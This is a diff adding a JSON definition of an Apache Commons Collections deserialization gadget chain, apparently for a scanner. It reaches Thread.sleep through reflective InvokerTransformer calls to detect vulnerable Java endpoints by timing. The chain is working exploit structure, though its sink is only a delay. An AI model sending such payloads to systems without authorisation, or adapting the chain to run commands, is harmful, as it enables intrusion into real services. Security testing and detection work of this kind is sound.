@@ -1,0 +1,52 @@
+{
+  "chain_type": "CC_Sleep - Thread.sleep() blind detection via DualHashBidiMap",
+  "root_class": "org.apache.commons.collections.bidimap.DualHashBidiMap",
+  "root_trigger": "readObject->HashMap.put->hash->TiedMapEntry.hashCode->LazyMap.get",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {"$ref": "link:1"},
+        "key": "foo"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": {},
+        "factory": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {"iConstant": "java.lang.Thread"}
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "getMethod",
+        "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+        "iArgs": ["sleep", ["long"]]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "invoke",
+        "iParamTypes": ["java.lang.Object", "[Ljava.lang.Object;"],
+        "iArgs": [null, [1]]
+      }
+    }
+  ],
+  "sink_method": "Thread.sleep"
+}
